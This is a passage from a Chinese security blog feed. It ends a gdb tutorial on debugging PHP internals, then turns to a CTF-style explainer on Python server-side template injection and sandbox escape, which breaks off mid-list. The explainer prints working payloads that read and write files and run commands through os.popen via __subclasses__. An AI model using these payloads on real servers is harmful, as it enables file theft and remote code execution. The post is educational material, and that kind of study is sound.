</span><br><span class="line">15  for(i = 0; i &lt; 10; i++)</span><br><span class="line">(gdb) </span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:17</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">(gdb) print value</span><br><span class="line">$5 = 8</span><br><span class="line">(gdb) print div</span><br><span class="line">$6 = 8</span><br></pre></td></tr></table></figure><p>在连续两次后 我们发现 value以及div的值都为8，继续使用next，我们可以得出结论当value与div值相等的时候程序会发生算术错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGFPE, Arithmetic exception.</span><br><span class="line">0x000000000040053d in wib (no1=8, no2=8) at eg1.c:6</span><br><span class="line">6  result = no1 / diff;</span><br></pre></td></tr></table></figure><p>我们重新run一次，这次我们使用condition命令，这样我们就不需要多次使用next查看，这样我们就一次就可以得到我们想要的结果了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run </span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /root/gbk_test/eg1 </span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:17</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">(gdb) print value</span><br><span class="line">$8 = 8</span><br></pre></td></tr></table></figure><h2 id="使用gdb调试php源码"><a href="#使用gdb调试php源码" class="headerlink" title="使用gdb调试php源码"></a>使用gdb调试php源码</h2><p>源码编译安装php 重要事情说100遍</p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p>PHP内部，变量都会用一个zval的结构体（struct）来表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _zval_struct &#123;</span><br><span class="line">    zvalue_value value;</span><br><span class="line">    zend_uint refcount__gc;</span><br><span class="line">    zend_uchar type;</span><br><span class="line">    zend_uchar is_ref__gc;</span><br><span class="line">&#125; zval;</span><br></pre></td></tr></table></figure><p>其中用于保存变量的值的字段是value，它的类型是zvalue_value，这是一个联合体(union)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef union _zvalue_value &#123;</span><br><span class="line">    long lval;</span><br><span class="line">    double dval;</span><br><span class="line">    struct &#123;</span><br><span class="line">        char *val;</span><br><span class="line">        int len;</span><br><span class="line">    &#125; str;</span><br><span class="line">    HashTable *ht;</span><br><span class="line">    zend_object_value obj;</span><br><span class="line">&#125; zvalue_value;</span><br></pre></td></tr></table></figure><p>如果变量的类型为整型，则使用lval这个字段存储它的值，如果是浮点型，则使用dval存储它的值。在zval结构体中有一个zend_uchar型的字段type来标识变量的类型，PHP内部提供了一些宏来表示变量的类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Type tagStorage location</span><br><span class="line">IS_NULL        none   </span><br><span class="line">IS_BOOL        long   lval</span><br><span class="line">IS_LONG        long   lval</span><br><span class="line">IS_DOUBLEdouble dval</span><br><span class="line">IS_STRINGstruct &#123; char *val; int len; &#125; str</span><br><span class="line">IS_ARRAYHashTable *ht</span><br><span class="line">IS_OBJECTzend_object_value obj</span><br><span class="line">IS_RESOURCElong lval</span><br></pre></td></tr></table></figure><h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><p>让我们继续探索下php弱类型（以下面一个例子就好了，以下结果会返回true）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./php -r &apos;var_dump([]&gt;1);&apos;</span><br></pre></td></tr></table></figure><p>我们将断点设在<code>is_smaller_function</code>，至于为什么，我之前文章有提及，run，list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2177ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */</span><br><span class="line">2178&#123;</span><br><span class="line">2179if (compare_function(result, op1, op2) == FAILURE) &#123;</span><br><span class="line">2180return FAILURE;</span><br><span class="line">2181&#125;</span><br><span class="line">2182ZVAL_BOOL(result, (Z_LVAL_P(result) &lt; 0));</span><br><span class="line">(gdb) </span><br><span class="line">2183return SUCCESS;</span><br><span class="line">2184&#125;</span><br><span class="line">2185/* &#125;&#125;&#125; */</span><br></pre></td></tr></table></figure><p>这里很显然使用compare_function进行比较，我们再次设置断点，continue，我们将 这三个变量打印出来<code>zval *result, zval *op1, zval *op2</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print *result</span><br><span class="line">$1 = &#123;value = &#123;lval = 20888608, dval = 1.0320343602244629e-316, counted = 0x13ebc20 &lt;compiler_globals&gt;, str = 0x13ebc20 &lt;compiler_globals&gt;, </span><br><span class="line">    arr = 0x13ebc20 &lt;compiler_globals&gt;, obj = 0x13ebc20 &lt;compiler_globals&gt;, res = 0x13ebc20 &lt;compiler_globals&gt;, ref = 0x13ebc20 &lt;compiler_globals&gt;, </span><br><span class="line">    ast = 0x13ebc20 &lt;compiler_globals&gt;, zv = 0x13ebc20 &lt;compiler_globals&gt;, ptr = 0x13ebc20 &lt;compiler_globals&gt;, ce = 0x13ebc20 &lt;compiler_globals&gt;, </span><br><span class="line">    func = 0x13ebc20 &lt;compiler_globals&gt;, ww = &#123;w1 = 20888608, w2 = 0&#125;&#125;, u1 = &#123;v = &#123;type = 61 &apos;=&apos;, type_flags = 0 &apos;\000&apos;, const_flags = 0 &apos;\000&apos;, </span><br><span class="line">      reserved = 0 &apos;\000&apos;&#125;, type_info = 61&#125;, u2 = &#123;next = 0, cache_slot = 0, lineno = 0, num_args = 0, fe_pos = 0, fe_iter_idx = 0, access_flags = 0, </span><br><span class="line">    property_guard = 0, extra = 0&#125;&#125;</span><br><span class="line">(gdb) print *op1</span><br><span class="line">$2 = &#123;value = &#123;lval = -1, dval = -nan(0xfffffffffffff), counted = 0xffffffffffffffff, str = 0xffffffffffffffff, arr = 0xffffffffffffffff, </span><br><span class="line">    obj = 0xffffffffffffffff, res = 0xffffffffffffffff, ref = 0xffffffffffffffff, ast = 0xffffffffffffffff, zv = 0xffffffffffffffff, ptr = 0xffffffffffffffff, </span><br><span class="line">    ce = 0xffffffffffffffff, func = 0xffffffffffffffff, ww = &#123;w1 = 4294967295, w2 = 4294967295&#125;&#125;, u1 = &#123;v = &#123;type = 4 &apos;\004&apos;, type_flags = 0 &apos;\000&apos;, </span><br><span class="line">      const_flags = 0 &apos;\000&apos;, reserved = 0 &apos;\000&apos;&#125;, type_info = 4&#125;, u2 = &#123;next = 0, cache_slot = 0, lineno = 0, num_args = 0, fe_pos = 0, fe_iter_idx = 0, </span><br><span class="line">    access_flags = 0, property_guard = 0, extra = 0&#125;&#125;</span><br><span class="line">(gdb) print *op2</span><br><span class="line">$3 = &#123;value = &#123;lval = 140737184649664, dval = 6.9533408027815013e-310, counted = 0x7fffede5d1c0, str = 0x7fffede5d1c0, arr = 0x7fffede5d1c0, obj = 0x7fffede5d1c0, </span><br><span class="line">    res = 0x7fffede5d1c0, ref = 0x7fffede5d1c0, ast = 0x7fffede5d1c0, zv = 0x7fffede5d1c0, ptr = 0x7fffede5d1c0, ce = 0x7fffede5d1c0, func = 0x7fffede5d1c0, ww = &#123;</span><br><span class="line">      w1 = 3991261632, w2 = 32767&#125;&#125;, u1 = &#123;v = &#123;type = 7 &apos;\a&apos;, type_flags = 20 &apos;\024&apos;, const_flags = 0 &apos;\000&apos;, reserved = 0 &apos;\000&apos;&#125;, type_info = 5127&#125;, u2 = &#123;</span><br><span class="line">    next = 32767, cache_slot = 32767, lineno = 32767, num_args = 32767, fe_pos = 32767, fe_iter_idx = 32767, access_flags = 32767, property_guard = 32767, </span><br><span class="line">    extra = 32767&#125;&#125;</span><br></pre></td></tr></table></figure><p>进入compare_function，next</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zendi_convert_scalar_to_number(op2, op2_copy, result, 1);</span><br></pre></td></tr></table></figure><p>可以看到这里进行了类型转化将op2转化成number，break zendi_convert_scalar_to_number</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a href="https://www.ibm.com/developerworks/cn/linux/sdk/gdb/index.html" target="_blank" rel="noopener">使用 GDB 调试 Linux 软件</a><p><a href="https://gywbd.github.io/posts/2016/2/debug-php-source-code.html" target="_blank" rel="noopener">调式PHP源码 </a><br><a href="http://www.shanghai.ws/gnu/gcc_1.htm" target="_blank" rel="noopener">GNU GCC中文文档</a><br><a href="http://gywbd.github.io/posts/2016/2/zend-execution-engine.html" target="_blank" rel="noopener">深入理解Zend执行引擎（PHP5）</a><br><a href="https://blog.izgq.net/archives/910/" target="_blank" rel="noopener">Ubuntu 16.04 编译安装 PHP 7.2</a></p>]]></content>
    
    <summary type="html">
    
      从零开始学习使用gdb调试PHP源码
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="PHP内核分析" scheme="https://museljh.github.io/tags/PHP%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
      <category term="gdb" scheme="https://museljh.github.io/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>Python服务端模板注入与沙盒逃逸的学习小结与实践</title>
    <link href="https://museljh.github.io/2019/03/20/Python%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <id>https://museljh.github.io/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/</id>
    <published>2019-03-19T16:47:46.000Z</published>
    <updated>2019-03-19T16:49:21.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。</p><p>正常而言，出于安全考虑，模板引擎基本上都是拥有沙盒、命名空间的，代码的解析执行都是发生在有限的沙盒里面，因此，沙盒逃逸也成为 SSTI 不可或缺的存在。</p><p>这里其实主要讲关于沙盒逃逸的，因为模板注入的话，我自己看哪些模板引擎的源码也不是非常懂里面到底写什么，很难比较深入的阐述，因为一般来说沙盒逃逸经常伴随着模板注入所以这里模板注入还是提一提，总的来说这篇其实是对沙盒逃逸常见payload的讲解。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="服务端模板注入"><a href="#服务端模板注入" class="headerlink" title="服务端模板注入"></a>服务端模板注入</h3><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。服务端模板注入，顾名思义，就是通过在服务端的模板文件或模板字符串中注入特定的恶意代码导致产生代码执行的一种漏洞攻击方式。<br>不同的模板引擎，根据不同的解析方式相应的也是存在不同的利用方法。</p><h3 id="服务端模板注入漏洞探测"><a href="#服务端模板注入漏洞探测" class="headerlink" title="服务端模板注入漏洞探测"></a>服务端模板注入漏洞探测</h3><p>详细来自</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a></p></blockquote><p>漏洞一般出现在这两种情况下，而每种有不同的探测手法：<br>文本类<br>大部分的模板语言支持我们输入 HTML，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smarty=Hello &#123;user.name&#125;</span><br><span class="line">Hello user1</span><br><span class="line"> </span><br><span class="line">freemarker=Hello $&#123;username&#125;</span><br><span class="line">Hello newuser</span><br><span class="line"> </span><br><span class="line">any=&lt;b&gt;Hello&lt;/b&gt;</span><br><span class="line">&lt;b&gt;Hello&lt;b&gt;</span><br></pre></td></tr></table></figure><p>代码类<br>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p><blockquote><p>personal_greeting=username<br>Hello user01</p></blockquote><p>我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">personal_greeting=username&lt;tag&gt;</span><br><span class="line">Hello</span><br><span class="line">personal_greeting=username&#125;&#125;&lt;tag&gt;</span><br><span class="line">Hello user01 &lt;tag&gt;</span><br></pre></td></tr></table></figure><h2 id="为什么模板注入可以使用沙盒绕过"><a href="#为什么模板注入可以使用沙盒绕过" class="headerlink" title="为什么模板注入可以使用沙盒绕过"></a>为什么模板注入可以使用沙盒绕过</h2><p>模板支持对应语言的“编程功能”以及一些简单的运算<br>模板并不是静态的放进去，虽然模板产品类型很多，但或多或少都能执行一些逻辑</p><blockquote><p>name=20   name=4</p></blockquote><p>而在python的Jinja2模板中，就能支持更多更强大的逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from jinja2 import Template</span><br><span class="line">str = &quot;&#123;% for i in [1,2,3] %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125;&quot;</span><br><span class="line">template = Template(&apos;your input: &#123;&#125;&apos;.format(str))</span><br><span class="line">print (template.render())</span><br></pre></td></tr></table></figure><p>其实我个人理解，就是在一些模板引擎中会有注册一些自己使用模块，没有注册的模块是不能使用的，所以沙盒逃逸其实就是一种被限制情况下的python终端</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><h4 id="SSTI-in-Tornado"><a href="#SSTI-in-Tornado" class="headerlink" title="SSTI in Tornado"></a>SSTI in Tornado</h4><p>护网杯 2018 WEB (1) easy_tornado<br>详解 &gt;<a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4</a></p><h3 id="沙盒技术"><a href="#沙盒技术" class="headerlink" title="沙盒技术"></a>沙盒技术</h3><p>实际上，沙盒就是一种类似影子系统的虚拟系统环境，它比带有宿主的虚拟机有着更深层次的系统内核级技术。它可以接管恶意软件的功能调用接口或函数行为，并且在确认了病毒行为之后实行回滚机制，并让系统保持一种干净的状态。详细可以看<a href="https://www.anquanke.com/post/id/85672" target="_blank" rel="noopener">这里</a></p><h3 id="python沙盒逃逸概述"><a href="#python沙盒逃逸概述" class="headerlink" title="python沙盒逃逸概述"></a>python沙盒逃逸概述</h3><p>沙箱逃逸,可以认为是从一个被限制的python环境绕过种种过滤和限制最周拿到更高权限甚至getshell，这是我们的最终的目的，但是实现这个目标之前我们必须解决的就是如何绕过重重的waf去使用python执行命令</p><p>这是我在K0rz3n师傅博客里看到的一段攻防可以很形象的描述，可以推荐先看看，<a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener">传送门</a></p><p>沙盒逃逸就是要在这样一种受到到限制的情况下，不断绕过限制最终达成getshell等目的</p><p>想要深入了解沙盒逃逸，python魔法方法肯定是要知道的，不然很容易知其然不知其所以然，一旦题目有了一定变化就容易不知所措。<br>1.魔法方法简介<br>我觉得想要较为深入了解python沙盒逃逸的内容必须先了解下python魔法方法，关于这些魔术方法在下面需要的时候我会讲解。</p><h3 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h3><h4 id="常见-payload1"><a href="#常见-payload1" class="headerlink" title="常见 payload1"></a>常见 payload1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read()</span><br><span class="line"></span><br><span class="line">#写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;)</span><br><span class="line"></span><br><span class="line">#执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )</span><br></pre></td></tr></table></figure><h4 id="1-1-xxx"><a href="#1-1-xxx" class="headerlink" title="1.1.().xxx"></a>1.1.<code>().xxx</code></h4><p>在一些沙盒逃逸的pyload中经常会出现’ ‘.xxx.xxx.xx或者是().xxx.xxx.xxx,[].xxx.xxx.xx<br>如果不是比较了解python的话理解起来其实是比较困难的<br>我现在来讲解下<br>首先type下‘ ’，和() ,[]<br><img src="https://i.imgur.com/TLY4Hqu.png" alt=""></p><blockquote><p>tuple是一种有序列表叫元组，和list非常类似，但是tuple一旦初始化就不能修改</p></blockquote><h4 id="1-2-class"><a href="#1-2-class" class="headerlink" title="1.2. ().__class__"></a>1.2. <code>().__class__</code></h4><p>().__class__是什么意思呢？当然想要明白这个问题首先我们得先知道下typle与__class__的差别</p><ul><li>type()<br>type 这个类实例化了一切，包括 object 和 他自己<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(1)</span><br><span class="line">&lt;class &apos;int&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(int)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(type)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(object)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure></li></ul><p>结论：<br>type-&gt;class-&gt;obj<br>2.object<br>object 是最顶层的基类，所有的类都继承了Object，包括type<br><img src="https://i.imgur.com/BjatiKo.png" alt=""><br>但是 object 是由 type 实例化的</p><p>示例代码：<br><img src="https://i.imgur.com/k9Lh8bu.png" alt=""></p><ul><li>__class__</li></ul><p>__class__与type()极为接近，但是有一定差别</p><p>(1)我们可以从一个对象实例到他的类<br>‘ ‘.__class__<br><img src="https://i.imgur.com/TLY4Hqu.png" alt=""></p><p><img src="https://i.imgur.com/1FJQMEp.png" alt=""></p><p>仅仅从上面两个例子确实是很难看出type与__class__之间的区别，不过我们这里姑且暂时简单将其理解为是type（）<br>想要具体了解的可以看这里</p><blockquote><p><a href="http://brionas.github.io/2014/09/15/python-type-class/" target="_blank" rel="noopener">http://brionas.github.io/2014/09/15/python-type-class/</a></p></blockquote><h4 id="1-3-class-bases-0"><a href="#1-3-class-bases-0" class="headerlink" title="1.3. ().__class__.__bases__[0]"></a>1.3. <code>().__class__.__bases__[0]</code></h4><p>元组，包含 类型对象(type, class) C 的全部基类，类型的实例通常没有属性 __bases__。概念其实是比较难理解的我们直接举例子</p><p><img src="https://i.imgur.com/BjatiKo.png" alt=""></p><p>这里我们可以看到通过__base__我们得到了object对象<br>那么这里又出现了个问题 __base__ 与__bases__有什么区别呢？</p><ul><li><code>__bases[0]__base__</code></li></ul><p>我们定义了两个类，M继承了C。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt;&gt;&gt; class C(object): pass</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; &gt;&gt;&gt; class M(C,type): pass</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; &gt;&gt;&gt; M.__bases__[0]</span><br><span class="line">&gt; &lt;class &apos;__main__.C&apos;&gt;</span><br><span class="line">&gt; &gt;&gt;&gt; M.__base__</span><br><span class="line">&gt; &lt;type &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到M.__base__是自己定义的type而 M.__bases__确是C<br>再举个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class A(object): pass</span><br><span class="line">class B(dict): pass</span><br><span class="line">class C(A, B): pass</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> C.__base__</span><br><span class="line">&lt;class &apos;__main__.B&apos;&gt;</span><br></pre></td></tr></table></figure><p>为什么呢？因为B定义了C的基类所以<code>C.__base__</code>是B</p><blockquote><p>这里要先知道的是一般情况下，python中一个子类只能有一个基类</p></blockquote><p>继续看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A(object): pass</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class B(A,type): pass</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; B.__bases__</span><br><span class="line">(&lt;class &apos;__main__.A&apos;&gt;, &lt;type &apos;type&apos;&gt;)</span><br></pre></td></tr></table></figure><p>可以看出<code>B.__bases__</code>的结果是一个元祖，并且自上而下直到B自己的基类。<br>那么<code>__bases__[0]与__base__区别是什么呢？应该有很多人可以直接得出答案了吧？</code><br>同样是上面那个例子，两者区别可以一眼看出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; B.__bases__[0]</span><br><span class="line">&lt;class &apos;__main__.A&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; B.__base__</span><br><span class="line">&lt;type &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure><p>再试试多继承,之前的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A(object): pass</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class B(dict): pass</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class C(A, B): pass</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; C.__base__</span><br><span class="line">&lt;class &apos;__main__.B&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; C.__bases__</span><br><span class="line">(&lt;class &apos;__main__.A&apos;&gt;, &lt;class &apos;__main__.B&apos;&gt;)</span><br></pre></td></tr></table></figure><h4 id="1-4-class-bases-0-subclasses-40"><a href="#1-4-class-bases-0-subclasses-40" class="headerlink" title="1.4.().__class__.__bases__[0].()__subclasses__[40]"></a>1.4.<code>().__class__.__bases__[0].()__subclasses__[40]</code></h4><ul><li><code>__subclasses__()</code><br>每个类都保留一个对其直接子类的弱引用列表<br>举两个例子<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int.__subclasses__()</span><br><span class="line">[&lt;type &apos;bool&apos;&gt;]</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Foo(object):</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class Bar(Foo):</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; print Foo.__subclasses__()</span><br><span class="line">[&lt;class &apos;__main__.Bar&apos;&gt;]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure><p>那么<code>__subclasses__()</code>其实的作用就是返回object的所有弱子类方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure><p>对于右边的[40]相信在看完3后应该都会比较了解了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, 